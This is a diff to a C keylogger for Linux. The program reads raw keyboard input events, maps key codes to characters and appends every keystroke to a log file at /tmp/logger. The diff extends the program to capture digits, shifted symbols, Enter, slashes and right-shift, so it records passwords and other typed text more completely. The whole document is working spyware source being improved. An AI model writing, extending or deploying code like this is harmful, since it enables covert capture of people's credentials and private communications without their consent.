@@ -9,8 +9,13 @@
 #include <sys/prctl.h>
 
 #define LOG "/tmp/logger"
+#define BUFFERSIZE 4096
 
 char keymap[KEY_SPACE + 1] = {
+	[KEY_1] = '1', [KEY_2] = '2', [KEY_3] = '3',
+	[KEY_4] = '4', [KEY_5] = '5', [KEY_6] = '6', 
+	[KEY_7] = '7', [KEY_8] = '8', [KEY_9] = '9',
+	[KEY_0] = '0', [KEY_MINUS] = '-', [KEY_EQUAL] = '=',  
 	[KEY_A] = 'a', [KEY_B] = 'b', [KEY_C] = 'c',
 	[KEY_D] = 'd', [KEY_E] = 'e', [KEY_F] = 'f',
 	[KEY_G] = 'g', [KEY_H] = 'h', [KEY_I] = 'i',
@@ -19,13 +24,18 @@ char keymap[KEY_SPACE + 1] = {
 	[KEY_P] = 'p', [KEY_Q] = 'q', [KEY_R] = 'r',
 	[KEY_S] = 's', [KEY_T] = 't', [KEY_U] = 'u',
 	[KEY_V] = 'v', [KEY_W] = 'w', [KEY_X] = 'x',
-	[KEY_Y] = 'y', [KEY_Z] = 'z', [KEY_SPACE] = ' ',
+	[KEY_Y] = 'y', [KEY_Z] = 'z', [KEY_ENTER] = '\n',
+	[KEY_SLASH] = '/', [KEY_BACKSLASH] = '\\', 
+	[KEY_SPACE] = ' ',
+	 
 };
+
 
 int write_file(char character){
 	char buffer[1];
 	buffer[0] = character;
-	int logfd = open(LOG, O_CREAT | O_WRONLY | O_APPEND, S_IROTH);
+	int logfd = open(LOG, O_CREAT | O_RDWR | O_APPEND, S_IROTH);
+	
 	fsync(logfd);
 	ssize_t written = write(logfd, &buffer, sizeof(buffer));
 	
@@ -36,6 +46,7 @@ int write_file(char character){
 	
 	return 1;
 }
+
 
 const char *locate_event(){
 	static char buffer[8];
@@ -55,6 +66,8 @@ const char *locate_event(){
 	}
 	return buffer;
 }
+
+
 void read_kbd(){
 	int shift_pressed = 0;
 	int caps_pressed = 0;
@@ -74,11 +87,13 @@ void read_kbd(){
 			break;
 		}
 
-		if(event.code == KEY_LEFTSHIFT && event.value == 1){
+
+		if((event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) && event.value == 1){
 			shift_pressed = 1;
 		} else if(event.code == KEY_LEFTSHIFT && event.value == 0){
 		  	shift_pressed = 0;
-		}
+		}	
+
 
 		if(event.type == EV_LED && event.code == LED_CAPSL){
 			if(event.value == 1){
@@ -87,15 +102,52 @@ void read_kbd(){
 				caps_pressed = 0;
 			}
 		}
+		
 
 		if(event.type == EV_KEY && event.value == 1){
-			if(shift_pressed == 1 || caps_pressed == 1){
+			if(shift_pressed == 1){
+				if (event.code == 2){
+					write_file('!');
+				}
+				else if(event.code == 3){
+					write_file('@');
+				}
+				else if(event.code == 4){
+					write_file('#');
+				}
+				else if(event.code == 5){
+					write_file('$');
+				}
+				else if(event.code == 6){
+					write_file('%');
+				}
+				else if(event.code == 7){
+					write_file('^');
+				}
+				else if(event.code == 8){
+					write_file('&');
+				}
+				else if(event.code == 9){
+					write_file('*');
+				}
+				else if(event.code == 10){
+					write_file('(');
+				}
+				else if(event.code == 11){
+					write_file(')');
+				}
+				else{
+				 	char key = keymap[event.code];
+					char upper_case = toupper(key);
+					write_file(upper_case);
+				}				
+
+			} else if(caps_pressed == 1){
 				char key = keymap[event.code];
 				char upper_case = toupper(key);
 				write_file(upper_case);
-			} else{
-				char key = keymap[event.code];
-				write_file(key);
+			} else {
+				write_file(keymap[event.code]);
 			}		
 		}
 	}		    	
